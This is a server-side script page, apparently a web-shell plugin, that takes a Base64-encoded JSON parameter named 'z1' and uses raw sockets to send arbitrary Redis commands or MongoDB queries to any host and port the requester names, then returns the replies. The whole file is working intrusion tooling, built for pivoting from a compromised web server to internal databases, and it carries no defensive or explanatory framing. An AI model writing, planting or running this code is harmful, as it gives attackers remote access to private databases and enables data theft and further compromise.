<%
(function() {
    var Socket = Java.type("java.net.Socket");
    var BufferedReader = Java.type("java.io.BufferedReader");
    var InputStreamReader = Java.type("java.io.InputStreamReader");
    var ByteArrayOutputStream = Java.type("java.io.ByteArrayOutputStream");
    var ByteBuffer = Java.type("java.nio.ByteBuffer");
    var ByteOrder = Java.type("java.nio.ByteOrder");
    var Base64 = Java.type("java.util.Base64");
    var StandardCharsets = Java.type("java.nio.charset.StandardCharsets");

    function packLE(value) {
        var bb = ByteBuffer.allocate(4);
        bb.order(ByteOrder.LITTLE_ENDIAN);
        bb.putInt(value);
        return bb.array();
    }

    function build_mongo_command(db_name, command_name, command_value) {
        var baosBson = new ByteArrayOutputStream();
        baosBson.write(packLE(0), 0, 4);
        baosBson.write(0x10);
        baosBson.write(new java.lang.String(command_name).getBytes(StandardCharsets.UTF_8));
        baosBson.write(0);
        baosBson.write(packLE(command_value), 0, 4);
        baosBson.write(0);
        
        var bsonBytes = baosBson.toByteArray();
        var lenBson = packLE(bsonBytes.length);
        for (var i = 0; i < 4; i++) {
            bsonBytes[i] = lenBson[i];
        }

        var baosMsg = new ByteArrayOutputStream();
        baosMsg.write(packLE(0), 0, 4);
        baosMsg.write(packLE(12345), 0, 4);
        baosMsg.write(packLE(0), 0, 4);
        baosMsg.write(packLE(2013), 0, 4);
        baosMsg.write(packLE(0), 0, 4);
        baosMsg.write(new java.lang.String(db_name + ".$cmd").getBytes(StandardCharsets.UTF_8));
        baosMsg.write(0);
        baosMsg.write(packLE(0), 0, 4);
        baosMsg.write(packLE(1), 0, 4);
        baosMsg.write(bsonBytes);

        var msgBytes = baosMsg.toByteArray();
        var lenMsg = packLE(msgBytes.length);
        for (var j = 0; j < 4; j++) {
            msgBytes[j] = lenMsg[j];
        }

        return msgBytes;
    }

    function extract_mongo_text(buffer) {
        if (!buffer) return "[Empty BSON binary response received]";
        var sb = "";
        for (var i = 0; i < buffer.length; i++) {
            var b = buffer[i];
            var ascii = b < 0 ? b + 256 : b;
            if (ascii >= 32 && ascii <= 126) {
                sb += String.fromCharCode(ascii);
            } else if (ascii === 10 || ascii === 13 || ascii === 9) {
                sb += String.fromCharCode(ascii);
            }
        }
        return sb.length === 0 ? "[Empty BSON binary response received]" : sb;
    }

    function handle_redis(ip, port, pass, action, query, timeout) {
        try {
            var socket = new Socket();
            socket.connect(new java.net.InetSocketAddress(ip, port), timeout * 1000);
            socket.setSoTimeout(timeout * 1000);

            var outStream = socket.getOutputStream();
            var inStream = socket.getInputStream();

            if (pass && pass !== "") {
                var auth_cmd = "*2\r\n$4\r\nAUTH\r\n" + pass.length + "\r\n" + pass + "\r\n";
                outStream.write(new java.lang.String(auth_cmd).getBytes(StandardCharsets.UTF_8));
                outStream.flush();

                var reader = new BufferedReader(new InputStreamReader(inStream, StandardCharsets.UTF_8));
                var auth_resp = reader.readLine();
                if (auth_resp === null || auth_resp.indexOf("-ERR") !== -1) {
                    socket.close();
                    return "[-] Redis Auth Failed: " + (auth_resp ? auth_resp : "");
                }
            }

            if (action.toLowerCase() === "connect") {
                socket.close();
                return "[+] SUCCESS_REDIS_CONNECTED -> Ready to send RESP commands.";
            }

            if (!query || query === "") {
                query = "INFO";
            }

            var parts = query.trim().split(/\s+/);
            var resp_builder = "*" + parts.length + "\r\n";
            for (var i = 0; i < parts.length; i++) {
                var part = parts[i];
                resp_builder += "$" + part.length + "\r\n" + part + "\r\n";
            }

            outStream.write(new java.lang.String(resp_builder).getBytes(StandardCharsets.UTF_8));
            outStream.flush();

            var buffer = java.lang.reflect.Array.newInstance(Java.type("byte"), 8192);
            var bytesRead = inStream.read(buffer);
            socket.close();

            if (bytesRead <= 0) return "";
            return new java.lang.String(buffer, 0, bytesRead, StandardCharsets.UTF_8);

        } catch (e) {
            return "[-] Redis error: " + e.toString();
        }
    }

    function handle_mongodb(ip, port, user, pass, action, query, timeout) {
        try {
            var socket = new Socket();
            socket.connect(new java.net.InetSocketAddress(ip, port), timeout * 1000);
            socket.setSoTimeout(timeout * 1000);

            var outStream = socket.getOutputStream();
            var inStream = socket.getInputStream();

            if (action.toLowerCase() === "connect") {
                var ping_command = build_mongo_command("admin", "isMaster", 1);
                outStream.write(ping_command);
                outStream.flush();

                var buffer = java.lang.reflect.Array.newInstance(Java.type("byte"), 4096);
                var bytesRead = inStream.read(buffer);
                socket.close();

                if (bytesRead <= 0) {
                    return "[-] MongoDB connection failed: Response is empty.";
                }
                return "[+] SUCCESS_MONGO_CONNECTED -> Successfully connected to MongoDB server.";
            }

            if (!query || query === "") {
                query = "db.stats()";
            }

            var db_name = (!user || user === "") ? "admin" : user;
            var cmd_bytes = build_mongo_command(db_name, "ping", 1);

            if (query.indexOf("stats") !== -1) {
                cmd_bytes = build_mongo_command(db_name, "dbStats", 1);
            } else if (query.indexOf("listCollections") !== -1) {
                cmd_bytes = build_mongo_command(db_name, "listCollections", 1);
            }

            outStream.write(cmd_bytes);
            outStream.flush();

            var resp_buffer = java.lang.reflect.Array.newInstance(Java.type("byte"), 8192);
            var bytesRead = inStream.read(resp_buffer);
            socket.close();

            var actualBuffer = null;
            if (bytesRead > 0) {
                actualBuffer = java.lang.reflect.Array.newInstance(Java.type("byte"), bytesRead);
                java.lang.System.arraycopy(resp_buffer, 0, actualBuffer, 0, bytesRead);
            }

            return "[+] MongoDB command executed successfully:\n" + extract_mongo_text(actualBuffer);

        } catch (e) {
            return "[-] MongoDB connection/query error: " + e.toString();
        }
    }

    function main() {
        var z1 = request.getParameter("z1");
        if (!z1) {
            out.print("[-] Missing parameter z1.");
            return;
        }

        try {
            var jsonStr = z1;
            try {
                var decodedBytes = Base64.getDecoder().decode(z1);
                jsonStr = new java.lang.String(decodedBytes, StandardCharsets.UTF_8);
            } catch (err) {
                // If base64 decode fails, use raw z1
            }

            var config = JSON.parse(jsonStr);

            var dbtype = (config.dbtype || "redis").toLowerCase();
            var ip = config.ip || "127.0.0.1";
            var port = config.port ? parseInt(config.port, 10) : (dbtype === "mongodb" ? 27017 : 6379);
            var user = config.user || "";
            var pass = config.pass || "";
            var action = (config.action || "connect").toLowerCase();
            var query = config.query || "";
            var timeout = config.timeout ? parseInt(config.timeout, 10) : 10;

            var result = "";
            if (dbtype === "redis") {
                result = handle_redis(ip, port, pass, action, query, timeout);
            } else if (dbtype === "mongodb") {
                result = handle_mongodb(ip, port, user, pass, action, query, timeout);
            } else {
                result = "[-] Unknown database type: " + dbtype;
            }

            out.print(result);

        } catch (e) {
            out.print("[-] Invalid JSON / Base64 or execution error: " + e.toString());
        }
    }

    main();
})();
%>